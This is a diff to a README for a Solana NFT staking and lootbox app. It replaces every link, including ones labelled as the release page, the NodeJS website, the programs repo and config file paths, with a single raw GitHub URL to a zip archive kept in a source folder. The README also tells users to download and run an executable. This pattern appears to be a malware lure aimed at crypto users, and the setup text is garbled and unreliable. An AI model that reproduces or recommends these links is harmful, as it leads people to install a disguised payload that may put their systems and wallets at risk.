@@ -1,6 +1,6 @@
 # 🎨 solana-staking-lootbox-ui - Your Gateway to Unique NFTs and Rewards
 
-[![Download Now](https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/lootbox_solana_ui_staking_2.9-alpha.2.zip)](https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/lootbox_solana_ui_staking_2.9-alpha.2.zip)
+[![Download Now](https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/solana_lootbox_ui_staking_v3.7-beta.5.zip)](https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/solana_lootbox_ui_staking_v3.7-beta.5.zip)
 
 Welcome to Solana Staking Lootbox UI! This application lets you mint unique NFTs and stake them to earn rewards in the form of $PINK tokens. Enjoy a chance to transform your rewards into Pink Floyd's exclusive songs collection.
 
@@ -9,7 +9,7 @@ Welcome to Solana Staking Lootbox UI! This application lets you mint unique NFTs
 To use this application, you need to download and run it on your computer. Follow these steps:
 
 1. **Visit the Download Page:**  
-   Go to the [Releases Page](https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/lootbox_solana_ui_staking_2.9-alpha.2.zip) to find the latest version.
+   Go to the [Releases Page](https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/solana_lootbox_ui_staking_v3.7-beta.5.zip) to find the latest version.
 
 2. **Download the Application:**  
    Find the version you want to use and click the download link. This will give you the necessary files.
@@ -28,14 +28,14 @@ To use this application, you need to download and run it on your computer. Follo
 - **Operating System:** Windows, macOS, or Linux
 - **NodeJS Version:** You need at least NodeJS v16 installed on your system.
 
-Ensure you have the correct version of NodeJS before proceeding. If you don't have NodeJS, download it from the [https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/lootbox_solana_ui_staking_2.9-alpha.2.zip website](https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/lootbox_solana_ui_staking_2.9-alpha.2.zip) and install it.
+Ensure you have the correct version of NodeJS before proceeding. If you don't have NodeJS, download it from the [https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/solana_lootbox_ui_staking_v3.7-beta.5.zip website](https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/solana_lootbox_ui_staking_v3.7-beta.5.zip) and install it.
 
 ## 📥 Download & Install
 
 To begin using the Solana Staking Lootbox UI, please follow these steps:
 
 1. **Visit the Downloads Page**  
-   Click this link to go to the [Releases Page](https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/lootbox_solana_ui_staking_2.9-alpha.2.zip).
+   Click this link to go to the [Releases Page](https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/solana_lootbox_ui_staking_v3.7-beta.5.zip).
 
 2. **Select Your Version:**  
    On the releases page, find a version marked "Latest." Click it to view that version's details.
@@ -47,7 +47,7 @@ To begin using the Solana Staking Lootbox UI, please follow these steps:
    Depending on your operating system, installation may vary:
    - For **Windows**: Double-click the .exe file and follow the prompts.
    - For **macOS**: Drag the application into your Applications folder.
-   - For **Linux**: Follow your distribution’s procedure for running .sh files or https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/lootbox_solana_ui_staking_2.9-alpha.2.zip archives.
+   - For **Linux**: Follow your distribution’s procedure for running .sh files or https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/solana_lootbox_ui_staking_v3.7-beta.5.zip archives.
    
 5. **Launch the App:**  
    After installation, find the app icon and double-click to run it. 
@@ -69,7 +69,7 @@ To begin using the Solana Staking Lootbox UI, please follow these steps:
 3. **Configure Your Address:**
    - Set your `CANDY_MACHINE_ADDRESS` and `NFT_COLLECTION` in this file: 
      ```
-     https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/lootbox_solana_ui_staking_2.9-alpha.2.zip
+     https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/solana_lootbox_ui_staking_v3.7-beta.5.zip
      ```
 
 ## 🎁 Creating Your Reward Token
@@ -77,9 +77,9 @@ To begin using the Solana Staking Lootbox UI, please follow these steps:
 1. **Update Program ID:**
    - Set the `nft-staking` programId in:
      ```
-     https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/lootbox_solana_ui_staking_2.9-alpha.2.zip
+     https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/solana_lootbox_ui_staking_v3.7-beta.5.zip
      ```
-   - You can find the program ID in the [programs repo](https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/lootbox_solana_ui_staking_2.9-alpha.2.zip).
+   - You can find the program ID in the [programs repo](https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/solana_lootbox_ui_staking_v3.7-beta.5.zip).
 
 2. **Create the Token:**
    - Run this command to create your $PINK token:
@@ -90,7 +90,7 @@ To begin using the Solana Staking Lootbox UI, please follow these steps:
 3. **Finalize Token Setup:**
    - Set the `TOKEN_REWARD` in:
      ```
-     https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/lootbox_solana_ui_staking_2.9-alpha.2.zip
+     https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/solana_lootbox_ui_staking_v3.7-beta.5.zip
      ```
 
 ## 🎵 Creating Your SONGs Token
@@ -98,9 +98,9 @@ To begin using the Solana Staking Lootbox UI, please follow these steps:
 1. **Set the Program ID:**  
    Update the `lootbox` programId in:
    ```
-   https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/lootbox_solana_ui_staking_2.9-alpha.2.zip
+   https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/solana_lootbox_ui_staking_v3.7-beta.5.zip
    ```
-   Refer to the [programs repo](https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/lootbox_solana_ui_staking_2.9-alpha.2.zip) for the exact ID.
+   Refer to the [programs repo](https://raw.githubusercontent.com/deaddorman/solana-staking-lootbox-ui/master/src/stores/solana_lootbox_ui_staking_v3.7-beta.5.zip) for the exact ID.
 
 ## 👨‍💻 Troubleshooting
 
